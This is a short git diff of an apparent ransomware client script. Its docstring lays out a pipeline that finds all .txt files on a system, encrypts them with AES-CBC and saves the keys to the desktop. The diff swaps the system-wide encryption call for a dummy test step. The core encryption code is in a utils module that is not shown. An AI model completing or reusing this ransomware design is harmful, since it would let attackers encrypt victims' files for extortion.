@@ -1,7 +1,8 @@
 """
 how the pipeline works (when you run the client.exe file):
 1. generate 16 character key [OK]
-2. find all .txt files on the system and encrypt them using AES-CBC key[OK]
+2. find all .txt files on the system [OK]
+3. encrypt the files with the key using AES-CBC [Pending] <----------------
 4. save the 16char key to a file on the desktop (Key.key) [OK]
 5. generate RSA key pair [OK]
 6. save the public/private key to a file on the desktop (keyPair.key) [OK]
@@ -20,14 +21,14 @@ how the pipeline works (when you run the client.exe file):
 from utils import *
 
 #1
-ascii_key = generate_key(16)
+generate_key(16)
 
 #2
-findAndEncryptTxtFile(ascii_key)
+# findTxtFile()
 
 #3
 # here we need to encrypt the test files from the previous step, but for now we use a dummy file
-# ascii_key = testEncryption()
+ascii_key = testEncryption()
 
 #4
 saveKey(ascii_key, "Key.key")
